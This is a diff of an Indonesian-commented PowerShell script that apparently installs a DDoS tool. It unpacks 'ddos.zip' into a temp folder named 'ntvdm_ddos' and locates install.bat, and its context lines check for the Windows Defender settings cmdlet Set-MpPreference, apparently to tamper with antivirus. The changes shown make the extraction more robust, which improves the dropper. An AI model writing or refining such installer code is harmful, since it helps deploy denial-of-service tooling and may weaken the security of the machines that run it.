@@ -11,8 +11,7 @@ if (Get-Command "Set-MpPreference" -ErrorAction SilentlyContinue) {
 # Tentukan direktori temp
 $TempDir = "$env:TEMP\ntvdm_ddos"
 $ZipFile = "$TempDir\ddos.zip"
-$ExtractDir = "$TempDir\ddos"
-$InstallBat = "$ExtractDir\install.bat"
+$ExtractDir = "$TempDir\extract"
 
 # Hapus sisa file lama jika ada
 if (Test-Path $TempDir) { Remove-Item $TempDir -Recurse -Force }
@@ -37,11 +36,31 @@ if (-not (Test-Path $ZipFile)) {
     exit
 }
 
-# Ekstrak ZIP
+# Verifikasi apakah file ZIP valid
+try {
+    Write-Host "Memverifikasi file ZIP..." -ForegroundColor Green
+    [System.IO.Compression.ZipFile]::OpenRead($ZipFile).Dispose()
+} catch {
+    Write-Host "File ZIP rusak atau tidak valid!" -ForegroundColor Red
+    exit
+}
+
+# Buat folder ekstraksi
+New-Item -Path $ExtractDir -ItemType Directory -Force | Out-Null
+
+# Mengekstrak file ZIP (metode yang lebih stabil)
 Write-Host "Mengekstrak file ZIP..." -ForegroundColor Green
-Expand-Archive -Path $ZipFile -DestinationPath $ExtractDir -Force
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+[System.IO.Compression.ZipFile]::ExtractToDirectory($ZipFile, $ExtractDir)
+
+# Pindahkan semua file dari folder extract ke root temp
+Get-ChildItem -Path $ExtractDir\* -Recurse | Move-Item -Destination $TempDir
+
+# Hapus folder extract setelah selesai
+Remove-Item $ExtractDir -Recurse -Force
 
 # Verifikasi apakah install.bat ada
+$InstallBat = "$TempDir\install.bat"
 if (-not (Test-Path $InstallBat)) {
     Write-Host "File install.bat tidak ditemukan setelah ekstraksi!" -ForegroundColor Red
     exit
